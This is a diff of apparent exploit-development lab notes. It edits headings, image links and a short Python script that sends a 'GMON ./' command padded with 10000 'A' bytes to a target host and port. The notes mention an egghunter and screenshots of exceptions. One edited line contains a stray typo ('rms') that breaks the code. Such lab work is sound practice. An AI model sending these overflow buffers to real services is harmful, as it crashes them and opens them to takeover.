@@ -1,4 +1,4 @@
-## Initial payload
+# Initial payload
 
 - Code
 
@@ -28,11 +28,11 @@ s.close()
 
 - Screenshot
 
-![4b749a6b29b95f05cfd940b537976ac8.png](../_resources/4b749a6b29b95f05cfd940b537976ac8-1.png)
+![4b749a6b29b95f05cfd940b537976ac8.png](../_resources/4b749a6b29b95f05cfd940b537976ac8.png)
 
-## Update Payload 00
+# Update Payload 00
 
-- Code
+## Code
 
 ```
 #!/usr/bin/python
@@ -46,7 +46,7 @@ host = sys.argv[1]
 port = int(sys.argv[2])
 egghunter = b""
 
-buffer =  b"GMON "
+buffer =  b"GMON "rms
 buffer += b"./"+b"A"*10000
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -57,7 +57,12 @@ print (s.recv(1024))
 s.close()
 ```
 
-- Screenshot
+## Screenshot
+### 1st exception
+![4111638e417036fff6709e9697968f53.png](../_resources/4111638e417036fff6709e9697968f53.png)
 
-![221111.00.png](../_resources/221111.00.png)
+### 2nd exception
+![b55db23946d64bd6e022845e470e316a.png](../_resources/b55db23946d64bd6e022845e470e316a.png)
+
+
 
